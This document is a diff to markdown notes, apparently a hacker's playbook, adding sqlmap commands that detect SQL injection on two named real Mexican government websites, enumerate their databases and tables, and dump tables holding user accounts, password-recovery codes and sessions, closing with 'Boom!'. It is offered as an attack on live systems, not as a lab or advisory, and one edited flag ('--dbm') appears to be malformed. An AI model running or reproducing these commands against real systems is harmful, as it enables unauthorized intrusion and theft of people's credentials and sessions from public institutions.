@@ -58,6 +58,9 @@ Look behind you
  
 ## La venganza de los aluxes:
 
+---
+https://youtu.be/9hhXE5bUVdk?si=wJ4cXvyEUT8udp63
+---
  
 ### 1. SQLi Vuln Detection
 
@@ -68,7 +71,7 @@ sqlmap -u https://iieg[.]gob[.]mx/general.php?id=7
 ### 2. Schema & Databases enum
 
 ````
-sqlmap -u https://iieg[.]gob[.]mx/general.php?id=7 --dbi
+sqlmap -u https://iieg[.]gob[.]mx/general.php?id=7 --dbm
 ````
 
 ### 3. Tables from Database enum
@@ -76,6 +79,30 @@ sqlmap -u https://iieg[.]gob[.]mx/general.php?id=7 --dbi
 ````
 sqlmap -u https://iieg[.]gob[.]mx/general.php?id=7 -D iieggob_documentos --tables
 ````
+
+
+
+----
+
+### 1. Vuln Detection
+
+sqlmap -u https://apps[.]tlaquepaque[.]gob[.]mx/registro.php?id=5  
+
+### 2. Schema & Databases - enum
+
+sqlmap -u https://apps[.]tlaquepaque[.]gob[.]mx/registro.php?id=5 --dbs
+
+### 3. Tables from Database - enum
+
+sqlmap -u https://apps[.]tlaquepaque[.]gob[.]mx/registro.php?id=5 -D sga --tables 
+
+### 4. Selecting Table from a Database to dump
+
+sqlmap -u https://apps[.]tlaquepaque[.]gob[.]mx/registro.php?id=5 -D sga -T usuario --dump
+sqlmap -u https://apps[.]tlaquepaque[.]gob[.]mx/registro.php?id=5 -D sga -T usuario_codigo_recuperacion --dump
+sqlmap -u https://apps[.]tlaquepaque[.]gob[.]mx/registro.php?id=5 -D sga -T usuario_sesion --dump
+
+Boom!
  
  
  
